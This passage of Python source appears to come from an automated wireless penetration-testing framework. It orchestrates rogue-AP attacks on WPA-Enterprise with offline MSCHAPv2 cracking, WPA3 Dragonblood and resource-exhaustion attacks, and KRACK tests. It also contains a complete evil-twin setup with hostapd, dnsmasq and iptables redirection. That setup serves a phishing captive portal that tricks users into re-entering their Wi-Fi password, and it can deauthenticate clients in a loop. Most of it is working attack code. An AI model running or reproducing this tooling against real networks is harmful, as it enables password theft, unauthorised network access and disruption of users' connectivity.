                out_lines.append(decoded)
            _kill_proc(proc, wait_secs=10)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
            _parse_output(out_lines, label, out_file)
        except Exception as exc:
            err(f"wifite2 error ({label}): {exc}")

    if target_ssids:
        for ssid in target_ssids:
            merged_wl = _generate_ssid_wordlist(ssid, wordlist)
            extra = ["--essid", ssid]
            if target_bssids:
                extra += ["--bssid", target_bssids[0]]
            safe = re.sub(r'[^\w]', '_', ssid)
            log(f"[1b] wifite2: targeting '{ssid}'")
            _run_wifite(extra, wifite_dir / f"wifite_{safe}.txt", ssid, merged_wl)
            # Clean up temp wordlist
            if merged_wl and merged_wl != wordlist and os.path.exists(merged_wl):
                try:
                    os.unlink(merged_wl)
                except Exception:
                    pass
    else:
        log("[1b] wifite2: scanning all visible networks")
        _run_wifite([], wifite_dir / "wifite_all.txt", "(all networks)", wordlist)

    status("p1b_wifite", "Phase 1b: WPA Handshake + WPS", "complete")


# ── Phase 2: EAPHammer — WPA-Enterprise + asleap cracking ────────────────────
# EAPHammer — by s0lst1c3 (https://github.com/s0lst1c3/eaphammer)

def phase_eaphammer(
    monitor_iface: str, target_aps: list[dict],
    eaphammer_path: str, output_dir: Path,
    auth: str = "wpa-eap", timeout: int = 300,
    asleap_path: str = "",
) -> None:
    """
    Phase 2: EAPHammer rogue AP + optional asleap offline cracking.
    After EAPHammer captures MSCHAPv2 challenge/response, asleap is run
    against the credential files to attempt offline dictionary-based cracking.
    """
    if not os.path.exists(eaphammer_path):
        log(f"[~] EAPHammer not found at {eaphammer_path} — skipping Phase 2")
        status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "skipped",
               "not installed")
        return

    status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "running")
    eap_dir = output_dir / "eaphammer"
    eap_dir.mkdir(parents=True, exist_ok=True)

    enterprise_aps = [
        ap for ap in target_aps
        if _in_scope(ap)
        and re.search(r'WPA.*EAP|Enterprise|802\.1X', ap.get("encryption", ""), re.I)
    ]
    if not enterprise_aps and target_aps:
        enterprise_aps = [ap for ap in target_aps[:3] if _in_scope(ap)]
    if not enterprise_aps:
        log("[~] EAPHammer: no WPA-Enterprise targets — skipping")
        status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "skipped",
               "no enterprise targets")
        return

    # Resolve asleap binary
    _asleap = (asleap_path if asleap_path and os.path.exists(asleap_path)
               else shutil.which("asleap") or "")

    for ap in enterprise_aps[:3]:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        if not ssid:
            continue

        cred_dir = eap_dir / re.sub(r'[^\w]', '_', ssid)
        cred_dir.mkdir(parents=True, exist_ok=True)
        out_file = eap_dir / f"eaphammer_{re.sub(r'[^\w]', '_', ssid)}.txt"

        cmd = [
            "sudo", "python3", eaphammer_path,
            "--interface", monitor_iface,
            "--channel", str(channel),
            "--essid", ssid,
            "--auth", auth,
            "--creds", "--creds-output", str(cred_dir),
        ]
        if bssid:
            cmd += ["--bssid", bssid]

        log(f"[2] EAPHammer: rogue AP '{ssid}' ch={channel} auth={auth}")
        cred_found = False
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if proc.stdout is None:
                raise RuntimeError("EAPHammer stdout unavailable")
            out_lines: list[str] = []
            deadline = time.time() + timeout
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                if not cred_found and re.search(
                    r'challenge|response|MSCHAPv2|username|password', decoded, re.I
                ):
                    cred_found = True
                    finding_from_cat(
                        "AETHER-003",
                        data={"ssid": ssid, "bssid": bssid, "auth": auth,
                              "creds_dir": str(cred_dir)},
                        output_file=str(cred_dir),
                        title_override=f"WPA-Enterprise Credentials Captured: {ssid}",
                    )
            _kill_proc(proc)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
        except Exception as exc:
            err(f"EAPHammer error: {exc}")
            continue

        # asleap post-processing: attempt offline MSCHAPv2 cracking
        if cred_found and _asleap:
            _run_asleap(_asleap, cred_dir, ssid, out_file)

    status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "complete")


def _run_asleap(asleap_bin: str, cred_dir: Path, ssid: str,
                out_file: Path) -> None:
    """Run asleap against EAPHammer-captured NetNTLMv2/MSCHAPv2 hash files."""
    # EAPHammer writes challenge:response or .netntlm files in cred_dir
    hash_files = (
        list(cred_dir.glob("*.netntlm")) +
        list(cred_dir.glob("*.txt")) +
        list(cred_dir.glob("creds-*"))
    )
    if not hash_files:
        return
    for hf in hash_files[:3]:
        content = hf.read_text(encoding="utf-8", errors="replace")
        # Look for challenge:response format used by asleap
        m = re.search(
            r'(?:challenge|chall)[:\s]+([0-9a-fA-F]+).*?'
            r'(?:response|resp)[:\s]+([0-9a-fA-F]+)',
            content, re.I | re.DOTALL,
        )
        if not m:
            continue
        challenge = m.group(1)
        response  = m.group(2)
        log(f"[2] asleap: cracking MSCHAPv2 hash for {ssid!r}")
        asleap_out, _ = _run([
            asleap_bin,
            "-C", challenge,
            "-R", response,
        ], timeout=120)
        log(asleap_out)
        pw_m = re.search(r'(?:password|passwd|pw)[:\s]+(\S+)', asleap_out, re.I)
        if pw_m:
            finding_from_cat(
                "AETHER-018",
                data={"ssid": ssid, "password": pw_m.group(1),
                      "hash_file": str(hf)},
                output_file=str(out_file),
                title_override=f"MSCHAPv2 Cracked via asleap: {ssid}",
            )


# ── Phase 3: dragonslayer — WPA3 SAE cryptographic testing ───────────────────
# dragonslayer — by Mathy Vanhoef @vanhoefm (https://github.com/vanhoefm/dragonslayer)

_DRAGON_MODE: dict[int, tuple[str, list[str]]] = {
    0: ("AETHER-005", ["CVE-2019-9494"]),
    1: ("AETHER-004", ["CVE-2019-9494", "CVE-2019-9495"]),
    2: ("AETHER-006", ["CVE-2019-9495", "CVE-2019-9497", "CVE-2019-9498", "CVE-2019-9499"]),
    3: ("AETHER-007", ["CVE-2019-9500", "CVE-2019-9501", "CVE-2019-9502"]),
}


def phase_dragonslayer(
    monitor_iface: str, target_aps: list[dict],
    dragonslayer_client: str, output_dir: Path,
    attack: int = 1, client_conf: str = "", timeout: int = 180,
) -> None:
    if not os.path.exists(dragonslayer_client):
        log(f"[~] dragonslayer not found at {dragonslayer_client} — skipping Phase 3")
        status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "skipped", "not installed")
        return

    status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "running")
    ds_dir = output_dir / "dragonslayer"
    ds_dir.mkdir(parents=True, exist_ok=True)

    cat_id, cves = _DRAGON_MODE.get(attack, ("AETHER-004", ["CVE-2019-9494"]))

    wpa3_aps = [
        ap for ap in target_aps
        if _in_scope(ap) and re.search(r'WPA3|SAE', ap.get("encryption", ""), re.I)
    ]
    if not wpa3_aps:
        log("[~] dragonslayer: no WPA3/SAE targets — running against all in-scope targets")
        wpa3_aps = [ap for ap in target_aps[:3] if _in_scope(ap)]

    for ap in wpa3_aps[:3]:
        ssid      = ap.get("ssid", "unknown")
        safe_ssid = re.sub(r'[^\w]', '_', ssid)
        out_file  = ds_dir / f"dragonslayer_{safe_ssid}_attack{attack}.txt"

        conf_content = (
            f'network={{\n    ssid="{ssid}"\n    key_mgmt=SAE\n    sae_groups=19\n}}\n'
        )
        target_conf = str(ds_dir / f"client_{safe_ssid}.conf")
        try:
            with open(target_conf, "w") as cf:
                cf.write(conf_content)
        except Exception:
            target_conf = client_conf

        cmd = ["sudo", "bash", dragonslayer_client,
               "-i", monitor_iface, "-a", str(attack)]
        if target_conf:
            cmd += ["-c", target_conf]

        log(f"[3] dragonslayer: mode {attack} ({', '.join(cves)}) → '{ssid}'")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          cwd=str(os.path.dirname(dragonslayer_client)))
            if proc.stdout is None:
                raise RuntimeError("dragonslayer stdout unavailable")
            out_lines: list[str] = []
            deadline = time.time() + timeout
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                if re.search(
                    r'vulnerable|attack succeed|reflection|invalid curve|zero.scalar',
                    decoded, re.I,
                ):
                    finding_from_cat(
                        cat_id,
                        data={"ssid": ssid, "attack_mode": attack, "cves": cves},
                        output_file=str(out_file),
                        title_override=f"WPA3 SAE Dragonblood Mode {attack}: {ssid}",
                    )
            _kill_proc(proc)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
        except Exception as exc:
            err(f"dragonslayer error: {exc}")

    status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "complete")


# ── Phase 4: dragondrain — WPA3 SAE resource exhaustion ──────────────────────

def phase_dragondrain(
    monitor_iface: str, target_aps: list[dict],
    dragondrain_path: str, output_dir: Path,
    timeout: int = 60,
) -> None:
    """Finding only emitted when tool output explicitly reports AP exhaustion."""
    if not os.path.exists(dragondrain_path):
        log(f"[~] dragondrain not found — skipping Phase 4")
        status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "skipped",
               "not installed")
        return

    status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "running")
    drain_dir = output_dir / "dragondrain"
    drain_dir.mkdir(parents=True, exist_ok=True)

    for ap in [ap for ap in target_aps[:3] if _in_scope(ap)]:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        if not bssid:
            continue
        safe     = re.sub(r'[^\w]', '_', ssid or bssid)
        out_file = drain_dir / f"dragondrain_{safe}.txt"
        cmd = [
            "sudo", dragondrain_path,
            "-d", monitor_iface, "-a", bssid, "-c", str(channel),
            "-n", "10", "-r", "20", "-g", "21",
        ]
        log(f"[4] dragondrain: {ssid!r} [{bssid}]")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if proc.stdout is None:
                raise RuntimeError("dragondrain stdout unavailable")
            out_lines: list[str] = []
            deadline  = time.time() + timeout
            confirmed = False
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                if re.search(
                    r'exhausted|overflow|cpu|saturated|timed?\s*out|no\s*response',
                    decoded, re.I,
                ):
                    confirmed = True
            _kill_proc(proc)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
            if confirmed:
                finding_from_cat(
                    "AETHER-008",
                    data={"ssid": ssid, "bssid": bssid},
                    output_file=str(out_file),
                    title_override=f"WPA3 SAE Resource Exhaustion Confirmed: {ssid}",
                )
            else:
                log(f"[4] dragondrain: no exhaustion indicators for {ssid!r}")
        except Exception as exc:
            err(f"dragondrain error: {exc}")

    status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "complete")


# ── Phase 5: krackattacks — WPA2 KRACK key reinstallation testing ─────────────

def phase_krack(
    interface: str, target_aps: list[dict],
    krackattacks_path: str, output_dir: Path,
    timeout: int = 180,
) -> None:
    if not os.path.exists(krackattacks_path):
        log(f"[~] krackattacks-scripts not found — skipping Phase 5")
        status("p5_krack", "Phase 5: KRACK Testing", "skipped", "not installed")
        return

    status("p5_krack", "Phase 5: KRACK Testing", "running")
    krack_dir = output_dir / "krack"
    krack_dir.mkdir(parents=True, exist_ok=True)

    hwcrypto = os.path.join(os.path.dirname(krackattacks_path),
                             "disable-hwcrypto.sh")
    if os.path.exists(hwcrypto):
        log("[5] Disabling hardware crypto...")
        _run(["sudo", "bash", hwcrypto])

    test_variants = [
        ([],           "standard 4-way", "CVE-2017-13077", "AETHER-009"),
        (["--group"],  "group key",      "CVE-2017-13080", "AETHER-011"),
        (["--tptk"],   "TPTK variant",   "CVE-2017-13078", "AETHER-010"),
    ]

    for ap in [ap for ap in target_aps[:3] if _in_scope(ap)]:
        ssid  = ap.get("ssid", "")
        bssid = ap.get("bssid", "")
        if not bssid:
            continue
        safe = re.sub(r'[^\w]', '_', ssid or bssid)

        for flags, variant, cve, cat_id in test_variants:
            out_file = krack_dir / f"krack_{safe}_{variant.replace(' ', '_')}.txt"
            cmd = (["sudo", "python3", krackattacks_path]
                   + flags + ["--bssid", bssid])
            log(f"[5] KRACK {variant} ({cve}) → '{ssid}'")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              cwd=str(os.path.dirname(krackattacks_path)))
                if proc.stdout is None:
                    raise RuntimeError("krackattacks stdout unavailable")
                out_lines: list[str] = []
                deadline = time.time() + timeout
                while True:
                    line = _readline_timed(proc.stdout, deadline)
                    if line is None:
                        break
                    decoded = line.decode("utf-8", errors="replace").rstrip()
                    log(decoded)
                    out_lines.append(decoded)
                    if re.search(r'VULNERABLE|reinstalled|attack worked', decoded, re.I):
                        finding_from_cat(
                            cat_id,
                            data={"ssid": ssid, "bssid": bssid,
                                  "cve": cve, "variant": variant},
                            output_file=str(out_file),
                            title_override=f"WPA2 KRACK {variant.title()} ({cve}): {ssid}",
                        )
                _kill_proc(proc)
                out_file.write_text("\n".join(out_lines), encoding="utf-8")
            except Exception as exc:
                err(f"KRACK {variant} error: {exc}")

    status("p5_krack", "Phase 5: KRACK Testing", "complete")



# ── Captive portal constants ─────────────────────────────────────────────────

_CAPTIVE_IP   = "192.168.88.1"
_CAPTIVE_CIDR = "192.168.88.0/24"
_CAPTIVE_PORT = 8080
_CAPTIVE_DHCP_START = "192.168.88.100"
_CAPTIVE_DHCP_END   = "192.168.88.200"

_CAPTIVE_HTML = """\
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network Login</title>
<style>
body{{margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;
     background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}}
.card{{background:#fff;border-radius:12px;padding:2.5rem;width:90%;max-width:380px;
      box-shadow:0 4px 24px rgba(0,0,0,.12)}}
h2{{margin:0 0 .5rem;font-size:20px;color:#1a1a2e}}
p{{margin:0 0 1.5rem;font-size:14px;color:#555;line-height:1.5}}
label{{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:.4rem}}
input{{width:100%;box-sizing:border-box;padding:.7rem 1rem;border:1.5px solid #ddd;
      border-radius:8px;font-size:15px;outline:none}}
input:focus{{border-color:#4a9ad0}}
button{{width:100%;padding:.85rem;margin-top:1rem;background:#4a9ad0;color:#fff;
        border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}}
button:hover{{background:#3a8ac0}}
.hint{{font-size:12px;color:#888;margin-top:.4rem}}
.err{{color:#e74c3c;font-size:13px;margin-top:.5rem}}
</style></head>
<body><div class="card">
<h2>&#128246; {ssid}</h2>
<p>Your wireless session has expired. Please re-enter the network password to continue.</p>
<form method="POST" action="/"><label>Wi-Fi Password</label>
<input type="password" name="psk" placeholder="Network password" required autofocus>
{error}
<button type="submit">Continue</button>
<div class="hint">You will be reconnected automatically after authenticating.</div>
</form></div></body></html>"""

_CAPTIVE_SUCCESS_HTML = """\
<!DOCTYPE html><html><head><meta charset="utf-8"><title>Connecting...</title>
<style>body{{font-family:-apple-system,sans-serif;display:flex;justify-content:center;
align-items:center;min-height:100vh;background:#f0f2f5}}
.card{{background:#fff;border-radius:12px;padding:2.5rem;text-align:center;
box-shadow:0 4px 24px rgba(0,0,0,.12)}}h2{{color:#27ae60}}</style></head>
<body><div class="card"><h2>&#10003; Connected</h2>
<p>Reconnecting to the network, please wait...</p></div></body></html>"""

_cracked_psks: dict = {}


# ── Rogue AP / captive portal helpers ────────────────────────────────────────

def _find_ap_interface(exclude_ifaces: list) -> str:
    if platform.system() != "Linux":
        return ""
    net = Path("/sys/class/net")
    if not net.exists():
        return ""
    for p in sorted(net.iterdir()):
        name = p.name
        if name in exclude_ifaces:
            continue
        if not ((p / "wireless").exists() or (p / "phy80211").exists()):
            continue
        try:
            out, _ = _run(["iw", "dev", name, "info"], timeout=5)
            m = re.search(r"wiphy\s+(\d+)", out)
            if not m:
                continue
            phy_out, _ = _run(["iw", "phy", f"phy{m.group(1)}", "info"], timeout=5)
            if re.search(r"^\s+\* AP\b", phy_out, re.M):
                return name
        except Exception:
            pass
    return ""


def _psk_matches_pmkid(ssid: str, psk: str, ap_mac_hex: str,
                        client_mac_hex: str, pmkid_hex: str) -> bool:
    try:
        pmk   = hashlib.pbkdf2_hmac("sha1", psk.encode(), ssid.encode(), 4096, 32)
        ap_b  = bytes.fromhex(ap_mac_hex.replace(":", "").replace("-", ""))
        cli_b = bytes.fromhex(client_mac_hex.replace(":", "").replace("-", ""))
        h     = hmac.new(pmk, b"PMK Name" + ap_b + cli_b, hashlib.sha1)
        return h.digest()[:16].hex().lower() == pmkid_hex.lower().strip()
    except Exception:
        return False


def _load_pmkid_entries(output_dir: Path) -> list:
    """Return [(pmkid_hex, ap_mac_hex, client_mac_hex, ssid)] from any .hc22000 in output_dir."""
    entries = []
    for f in output_dir.rglob("*.hc22000"):
        try:
            for line in f.read_text(encoding="utf-8", errors="replace").splitlines():
                line = line.strip()
                if not line.startswith("WPA*01*"):
                    continue
                parts = line.split("*")
                if len(parts) < 6:
                    continue
                pmkid_hex, ap_mac, cli_mac, ssid_hex = parts[2], parts[3], parts[4], parts[5]
                try:
                    ssid = bytes.fromhex(ssid_hex).decode("utf-8", errors="replace")
                except Exception:
                    ssid = ssid_hex
                entries.append((pmkid_hex, ap_mac, cli_mac, ssid))
        except Exception:
            pass
    return entries


def _collect_cracked_psks(output_dir: Path) -> dict:
    """Scan phase output directories for cracked PSKs. Returns {bssid_upper: psk}."""
    result = {}
    for f in output_dir.rglob("*.pot"):
        try:
            for line in f.read_text(encoding="utf-8", errors="replace").splitlines():
                if ":" not in line:
                    continue
                hash_part, psk = line.rsplit(":", 1)
                psk = psk.strip()
                if not (8 <= len(psk) <= 63):
                    continue
                parts = hash_part.split("*")
                if len(parts) >= 4:
                    mac = parts[3].upper()
                    bssid = ":".join(mac[i:i+2] for i in range(0, 12, 2))
                    result[bssid] = psk
        except Exception:
            pass
    for f in output_dir.rglob("wpa*.txt"):
        try:
            for line in f.read_text(encoding="utf-8", errors="replace").splitlines():
                parts = line.split()
                if len(parts) >= 2 and re.match(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", parts[0]):
                    result[parts[0].upper()] = parts[-1].strip()
        except Exception:
            pass
    return result


def _assign_ip_to_iface(iface: str, ip_cidr: str) -> bool:
    try:
        subprocess.run(["ip", "addr", "flush", "dev", iface],
                       check=False, capture_output=True)
        subprocess.run(["ip", "addr", "add", ip_cidr, "dev", iface],
                       check=True, capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"],
                       check=True, capture_output=True)
        return True
    except Exception as exc:
        err(f"Could not assign {ip_cidr} to {iface}: {exc}")
        return False


def _write_hostapd_conf(ssid: str, bssid: str, channel: int,
                         encryption: str, psk: str, ap_iface: str,
                         work_dir: Path) -> Path:
    enc_up = (encryption or "").upper()
    if psk and ("WPA" in enc_up or "WPA2" in enc_up):
        security = (
            f"wpa=2\nwpa_passphrase={psk}\n"
            f"wpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"
        )
    else:
        security = ""
    conf = (
        f"interface={ap_iface}\n"
        f"driver=nl80211\n"
        f"ssid={ssid}\n"
        f"hw_mode=g\n"
        f"channel={channel or 6}\n"
        f"ignore_broadcast_ssid=0\n"
        f"bssid={bssid}\n" if bssid else ""
    ) + security
    conf_path = work_dir / "hostapd.conf"
    conf_path.write_text(conf, encoding="utf-8")
    return conf_path


def _write_dnsmasq_conf(ap_iface: str, work_dir: Path) -> Path:
    conf = (
        f"interface={ap_iface}\n"
        f"bind-interfaces\n"
        f"dhcp-range={_CAPTIVE_DHCP_START},{_CAPTIVE_DHCP_END},12h\n"
        f"dhcp-option=3,{_CAPTIVE_IP}\n"
        f"dhcp-option=6,{_CAPTIVE_IP}\n"
        f"address=/#/{_CAPTIVE_IP}\n"
        f"no-resolv\n"
        f"log-dhcp\n"
    )
    conf_path = work_dir / "dnsmasq.conf"
    conf_path.write_text(conf, encoding="utf-8")
    return conf_path


def _iptables_captive_setup(ap_iface: str) -> None:
    cmds = [
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
        ["iptables", "-A", "FORWARD", "-i", ap_iface, "-j", "DROP"],
    ]
    for c in cmds:
        subprocess.run(c, check=False, capture_output=True)


def _iptables_captive_teardown(ap_iface: str) -> None:
    cmds = [
        ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
        ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
        ["iptables", "-D", "FORWARD", "-i", ap_iface, "-j", "DROP"],
    ]
    for c in cmds:
        subprocess.run(c, check=False, capture_output=True)


def _iptables_nat_setup(ap_iface: str, upstream_iface: str) -> None:
    subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
                   check=False, capture_output=True)
    cmds = [
        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", upstream_iface, "-j", "MASQUERADE"],
        ["iptables", "-A", "FORWARD", "-i", ap_iface, "-o", upstream_iface, "-j", "ACCEPT"],
        ["iptables", "-A", "FORWARD", "-i", upstream_iface, "-o", ap_iface,
         "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    ]
    for c in cmds:
        subprocess.run(c, check=False, capture_output=True)


def _iptables_nat_teardown(ap_iface: str, upstream_iface: str) -> None:
    cmds = [
        ["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", upstream_iface, "-j", "MASQUERADE"],
        ["iptables", "-D", "FORWARD", "-i", ap_iface, "-o", upstream_iface, "-j", "ACCEPT"],
        ["iptables", "-D", "FORWARD", "-i", upstream_iface, "-o", ap_iface,
         "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    ]
    for c in cmds:
        subprocess.run(c, check=False, capture_output=True)


class _PortalHandler(BaseHTTPRequestHandler):
    ssid          = ""
    pmkid_entries = []
    result_q      = None
    captured_psks = []

    def log_message(self, fmt, *args):
        pass

    def _send_html(self, code: int, body: str) -> None:
        data = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path not in ("/", "/portal", "/generate_204", "/hotspot-detect.html"):
            self.send_response(302)
            self.send_header("Location", f"http://{_CAPTIVE_IP}:{_CAPTIVE_PORT}/")
            self.end_headers()
            return
        html = _CAPTIVE_HTML.format(ssid=self.ssid, error="")
        self._send_html(200, html)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode("utf-8", errors="replace")
        params = urllib.parse.parse_qs(body)
        psk    = (params.get("psk", [""])[0]).strip()
        if not psk:
            html = _CAPTIVE_HTML.format(ssid=self.ssid,
                                        error='<div class="err">Password cannot be empty.</div>')
            self._send_html(200, html)
            return
        _PortalHandler.captured_psks.append(psk)
        valid = False
        for pmkid_hex, ap_mac, cli_mac, cap_ssid in _PortalHandler.pmkid_entries:
            if _psk_matches_pmkid(self.ssid or cap_ssid, psk, ap_mac, cli_mac, pmkid_hex):
                valid = True
                break
        if valid and _PortalHandler.result_q is not None:
            _PortalHandler.result_q.put(("valid", psk))
        elif _PortalHandler.result_q is not None:
            _PortalHandler.result_q.put(("captured", psk))
        self._send_html(200, _CAPTIVE_SUCCESS_HTML)


def _run_portal_server(stop_evt: threading.Event) -> None:
    try:
        server = HTTPServer((_CAPTIVE_IP, _CAPTIVE_PORT), _PortalHandler)
        server.timeout = 1.0
        while not stop_evt.is_set():
            server.handle_request()
        server.server_close()
    except Exception as exc:
        err(f"Captive portal error: {exc}")


# ── Phase 6a: Rogue AP / Evil Twin ────────────────────────────────────────────

def phase_rogue_ap(monitor_iface: str, primary_iface: str, target_aps: list,
                   enriched_aps: list, output_dir: Path, rogue_cfg: dict,
                   timeout: int, cracked_psks: dict = None) -> None:
    status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "running")
    cracked_psks = cracked_psks or {}

    ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
    if not ap_iface:
        ap_iface = _find_ap_interface([monitor_iface, primary_iface])
    if not ap_iface:
        log("Phase 6: No second wireless interface found — skipping Rogue AP.")
        log("  Set rogue_ap.ap_interface in config to specify one explicitly.")
        status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "skipped")
        return

    aps = target_aps or enriched_aps
    if not aps:
        log("Phase 6: No target APs — skipping.")
        status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "skipped")
        return

    best = sorted(aps, key=lambda a: a.get("score", 0), reverse=True)[0]
    ssid       = best.get("ssid", "")
    bssid      = best.get("bssid", "")
    channel    = int(best.get("channel") or 6)
    encryption = (best.get("encryption") or "").upper()
    psk        = cracked_psks.get(bssid.upper(), "")

    use_portal  = rogue_cfg.get("phishing_portal", True) and not psk
    use_psk_ap  = bool(psk) and not use_portal
    deauth_cl   = rogue_cfg.get("deauth_clients", False)
    duration    = int(rogue_cfg.get("portal_duration", 180))

    rogue_dir = output_dir / "rogue_ap"
    rogue_dir.mkdir(exist_ok=True)
    log(f"Phase 6: Interface={ap_iface}  Target={ssid!r} [{bssid}]  "
        f"Mode={'WPA2+PSK' if use_psk_ap else 'Open+Portal' if use_portal else 'Open'}")

    # Assign IP to AP interface
    if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
        status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "error")
        return

    # Write configs
    ha_conf = _write_hostapd_conf(
        ssid, bssid, channel,
        "WPA2" if use_psk_ap else "OPEN", psk if use_psk_ap else "",
        ap_iface, rogue_dir,
    )
    dm_conf = _write_dnsmasq_conf(ap_iface, rogue_dir)

    # Load PMKID entries for portal validation
    pmkid_entries = _load_pmkid_entries(output_dir)
    _PortalHandler.ssid = ssid
    _PortalHandler.pmkid_entries = pmkid_entries
    _PortalHandler.captured_psks = []
    portal_q   = queue.Queue()
    _PortalHandler.result_q = portal_q
    stop_portal = threading.Event()

    hostapd_proc  = None
    dnsmasq_proc  = None
    captured_psk  = None
    connected_clients = []

    try:
        # Start dnsmasq
        dnsmasq_log = rogue_dir / "dnsmasq.log"
        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "--conf-file=" + str(dm_conf),
             "--pid-file=" + str(rogue_dir / "dnsmasq.pid"),
             "--log-facility=" + str(dnsmasq_log), "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(0.5)

        # Start hostapd
        hostapd_log = rogue_dir / "hostapd.log"
        with open(hostapd_log, "w") as hlog:
            hostapd_proc = subprocess.Popen(
                ["hostapd", str(ha_conf)],
                stdout=hlog, stderr=hlog,
            )
        time.sleep(2)
        if hostapd_proc.poll() is not None:
            err("Phase 6: hostapd failed to start — check hostapd.log")
            status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "error")
            return

        log(f"Phase 6: Rogue AP '{ssid}' active on {ap_iface} (channel {channel})")

        if use_portal:
            _iptables_captive_setup(ap_iface)
            portal_thread = threading.Thread(
                target=_run_portal_server, args=(stop_portal,), daemon=True
            )
            portal_thread.start()
            log("Phase 6: Captive portal active — waiting for client credentials")

        # Periodic deauth to force client reconnection to rogue AP
        deauth_t = None
        if deauth_cl:
            def _deauth_loop():
                while not stop_portal.is_set():
                    for ap in aps:
                        for cl in (ap.get("clients") or []):
                            _run(["aireplay-ng", "--deauth", "3",
                                  "-a", ap["bssid"], "-c", cl["mac"],
                                  monitor_iface], timeout=10)
                    time.sleep(15)
            deauth_t = threading.Thread(target=_deauth_loop, daemon=True)
            deauth_t.start()

        deadline = time.time() + duration
        while time.time() < deadline:
            time.sleep(2)
            # Check for captured PSK from portal
            while not portal_q.empty():
                kind, val = portal_q.get_nowait()
                log(f"Phase 6: PSK {'validated' if kind=='valid' else 'captured'}: "
                    f"{val[:4]}{'*'*(len(val)-4)}")
                captured_psk = val
                _cracked_psks[bssid.upper()] = val

            # Check clients in dnsmasq leases
            leases_file = Path("/var/lib/misc/dnsmasq.leases")
            if not leases_file.exists():
                leases_file = rogue_dir / "dnsmasq.leases"
            if leases_file.exists():
                try:
                    for line in leases_file.read_text().splitlines():
                        parts = line.split()
                        if len(parts) >= 4:
                            entry = {"mac": parts[1], "ip": parts[2], "hostname": parts[3]}
                            if entry not in connected_clients:
                                connected_clients.append(entry)
                                log(f"Phase 6: Client connected → {parts[2]} ({parts[1]})")
                except Exception:
                    pass

        stop_portal.set()

        # Report findings
        findings_data = {
            "ssid": ssid, "bssid": bssid, "channel": channel,
            "ap_interface": ap_iface,
            "clients_connected": len(connected_clients),
            "clients": connected_clients,
            "psk_captured": captured_psk or "",
            "psk_validated": bool(pmkid_entries and captured_psk),
            "portal_mode": use_portal,
        }
        (rogue_dir / "rogue_ap_results.json").write_text(
            json.dumps(findings_data, indent=2), encoding="utf-8"
        )

        if connected_clients:
            finding_from_cat(
